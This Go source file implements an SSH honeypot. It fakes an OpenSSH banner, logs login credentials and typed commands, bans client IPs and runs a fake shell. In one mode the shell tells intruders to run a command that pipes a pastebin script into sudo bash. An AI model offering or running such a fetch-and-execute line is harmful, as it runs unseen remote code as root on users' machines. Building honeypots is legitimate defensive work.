package main

import (
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"strings"
	"time"

	"github.com/fatih/color"
	"golang.org/x/crypto/ssh"
)

type Trap struct {
	Connection net.Conn
	Mode       ServerMode
	Signer     ssh.Signer
	Logger     BanLogger
}

func (trap Trap) HandleConnection() error {
	defer trap.Connection.Close()

	config := trap.buildSSHConfig()
	sshConnection, channels, requests, err := ssh.NewServerConn(trap.Connection, config)

	if err != nil {
		return trap.handleFailedHandshake()
	}

	go ssh.DiscardRequests(requests)
	return trap.processChannels(channels, sshConnection.User())
}

func (trap Trap) buildSSHConfig() *ssh.ServerConfig {
	config := &ssh.ServerConfig{
		ServerVersion:    "SSH-2.0-OpenSSH_8.4p1 Debian-5",
		PasswordCallback: trap.verifyPassword,
	}
	config.AddHostKey(trap.Signer)
	return config
}

func (trap Trap) verifyPassword(meta ssh.ConnMetadata, password []byte) (*ssh.Permissions, error) {
	trap.logLoginAttempt(meta, password)
	time.Sleep(time.Duration(800+rand.Intn(1200)) * time.Millisecond)

	if trap.Mode >= FakeShellMode {
		return nil, nil
	}
	return nil, fmt.Errorf("permission denied")
}

func (trap Trap) logLoginAttempt(meta ssh.ConnMetadata, password []byte) {
	clientIP := IPAddress{Address: meta.RemoteAddr()}.ExtractIP()
	color.Set(color.FgHiYellow)
	log.Printf("[LOG] user: %s pass: %s ip: %s", meta.User(), string(password), clientIP)
	color.Unset()
}

func (trap Trap) handleFailedHandshake() error {
	clientIP := IPAddress{Address: trap.Connection.RemoteAddr()}.ExtractIP()
	if trap.Mode >= 3 {
		color.BgRGB(255, 145, 0).Printf("IP: %s Connection not completed.", clientIP)
		color.Unset()
		fmt.Printf("\n")
		return nil
	}
	trap.Ban(clientIP, fmt.Sprintf("IP: %s successfully blocked", clientIP))
	return fmt.Errorf("IP connection: %s not completed or cut off", clientIP)
}

func (trap Trap) Ban(ip net.IP, messages string) {
	if trap.Mode < 3 {
		trap.Logger.RegisterBan(ip)
		color.Set(color.FgWhite, color.Bold)
		color.BgRGB(100, 0, 0).Println(messages)
		color.Unset()
	}
}

func (trap Trap) processChannels(channels <-chan ssh.NewChannel, user string) error {
	timeout := time.NewTimer(2 * time.Second)
	hasSession := false
	defer timeout.Stop()

	select {
	case channel, ok := <-channels:
		if !ok {
			return nil
		}
		hasSession = true
		trap.handleSingleChannel(channel, user)
		select {}
	case <-timeout.C:
		if !hasSession {
			clientIP := IPAddress{Address: trap.Connection.RemoteAddr()}.ExtractIP()
			trap.Connection.Close()
			trap.Ban(clientIP, fmt.Sprintf("IP: %s successfully No-shell", clientIP))
			return fmt.Errorf("connection closed: authenticated without shell (%s)", clientIP)
		}
	}
	return nil
}

func (trap Trap) handleSingleChannel(newChannel ssh.NewChannel, user string) {
	if newChannel.ChannelType() != "session" {
		newChannel.Reject(ssh.UnknownChannelType, "unknown channel")
		return
	}

	channel, requests, err := newChannel.Accept()
	if err != nil {
		return
	}

	time.Sleep(time.Duration(1+rand.Intn(3)) * time.Second)
	if trap.Mode < FakeShellMode {
		channel.Close()
		return
	}

	shell := TerminalSession{
		Channel:  channel,
		User:     user,
		Mode:     trap.Mode,
		ClientIP: IPAddress{Address: trap.Connection.RemoteAddr()},
		Logger:   trap.Logger,
	}
	go shell.Start(requests)
}

type TerminalSession struct {
	Channel  ssh.Channel
	User     string
	Mode     ServerMode
	ClientIP IPAddress
	Logger   BanLogger
}

func (session TerminalSession) Start(requests <-chan *ssh.Request) {
	defer session.Channel.Close()

	for request := range requests {
		session.handleRequestType(request)
	}
}

func (session TerminalSession) handleRequestType(request *ssh.Request) {
	switch request.Type {
	case "shell":
		request.Reply(true, nil)
		emulator := ShellEmulator{
			Channel:  session.Channel,
			User:     session.User,
			Mode:     session.Mode,
			ClientIP: session.ClientIP,
			Logger:   session.Logger,
		}
		go emulator.Loop()
	case "pty-req":
		request.Reply(true, nil)
	default:
		request.Reply(false, nil)
	}
}

type ShellEmulator struct {
	Channel       ssh.Channel
	User          string
	Mode          ServerMode
	ClientIP      IPAddress
	Logger        BanLogger
	CommandBuffer []byte
}

func (emulator *ShellEmulator) Loop() {
	emulator.wellcome()
	emulator.writePrompt()

	buffer := make([]byte, 1024)

	timeout := time.NewTimer(60 * time.Second)
	done := make(chan struct{})

	defer close(done)
	defer timeout.Stop()

	go func() {
		select {
		case <-timeout.C:
			emulator.Channel.Write([]byte("\r\nconnection timeout.\r\n"))
			emulator.Channel.Close()
		case <-done:
			return
		}
	}()

	for {
		bytesRead, err := emulator.Channel.Read(buffer)
		if err != nil {
			break
		}
		if !timeout.Stop() {
			select {
			case <-timeout.C:
			default:
			}
		}
		timeout.Reset(60 * time.Second)
		if emulator.processInputBuffer(buffer, bytesRead) {
			break
		}
	}
	if emulator.Mode < 3 {
		emulator.banAndDisconnect()
	}
}

func (emulator *ShellEmulator) processInputBuffer(buffer []byte, bytesRead int) bool {
	for index := 0; index < bytesRead; index++ {
		byteVal := buffer[index]
		if emulator.handleSingleByte(byteVal) {
			return true
		}
	}
	return false
}

func (emulator *ShellEmulator) handleSingleByte(byteVal byte) bool {
	if byteVal == 3 {
		emulator.Channel.Close()
		return true
	}

	if byteVal == '\r' || byteVal == '\n' {
		emulator.executeCommand()
		return false
	}

	if byteVal == 127 || byteVal == 8 {
		emulator.handleBackspace()
		return false
	}

	emulator.CommandBuffer = append(emulator.CommandBuffer, byteVal)
	emulator.Channel.Write([]byte{byteVal})
	return false
}

func (emulator *ShellEmulator) executeCommand() {
	commandLine := strings.TrimSpace(string(emulator.CommandBuffer))
	emulator.CommandBuffer = nil

	response := emulator.generateResponse(commandLine)
	emulator.Channel.Write([]byte(response))
	emulator.writePrompt()
}

func (emulator *ShellEmulator) CommandLogger(command string) {
	fileLog, err := os.OpenFile(
		"/var/log/MelisisCommandsLog.txt",
		os.O_APPEND|os.O_CREATE|os.O_WRONLY,
		0666,
	)
	if err != nil {
		log.Println("Error writing command in log")
		return
	}

	defer fileLog.Close()

	termlog := io.MultiWriter(fileLog, os.Stdout)
	logger := log.New(termlog, "", log.LstdFlags)
	color.Set(color.FgYellow)

	logger.Printf(
		"IP address: %s used the command: %s",
		emulator.ClientIP.ExtractIP(),
		command,
	)
	color.Unset()
}

func (emulator *ShellEmulator) generateResponse(commandLine string) string {
	emulator.CommandLogger(commandLine)
	if emulator.Mode >= Troll {
		return "\r\nSSH is incompatible.\r\nInstall the plugin using the command:\r\n    curl -sL https://pastebin.com/raw/eB7Ab1na | tr -d '\\r' | sudo bash\r\non your client and reconnect to use this shell.\r\n"
	}
	switch commandLine {
	case "help":
		return "\r\nThe help command was blocked in this installation; please read the manual on the Supla kernel website.\r\n"
	default:
		return fmt.Sprintf("\r\nbash: %s command not found.\r\n", commandLine)
	}
}

func (emulator *ShellEmulator) handleBackspace() {
	if len(emulator.CommandBuffer) > 0 {
		emulator.CommandBuffer = emulator.CommandBuffer[:len(emulator.CommandBuffer)-1]
		emulator.Channel.Write([]byte("\b \b"))
	}
}
func (emulator *ShellEmulator) wellcome() {
	banner := "\r\nkernel supla 3.0\r\nsupla is an operating system created and developed by zk.\r\nto learn about using the command: help\r\n"

	emulator.Channel.Write([]byte(banner))
}

func (emulator *ShellEmulator) writePrompt() {
	prompt := fmt.Sprintf("%s@server:~# ", emulator.User)
	emulator.Channel.Write([]byte(prompt))
}

func (emulator *ShellEmulator) banAndDisconnect() {
	targetIP := emulator.ClientIP.ExtractIP()
	if emulator.Logger.RegisterBan(targetIP) == nil {
		color.Set(color.FgWhite, color.Bold)
		color.BgRGB(100, 0, 0).Printf("ip: %s blocked (disconnect)", targetIP)
		color.Unset()
		fmt.Printf("\n")
	}
}
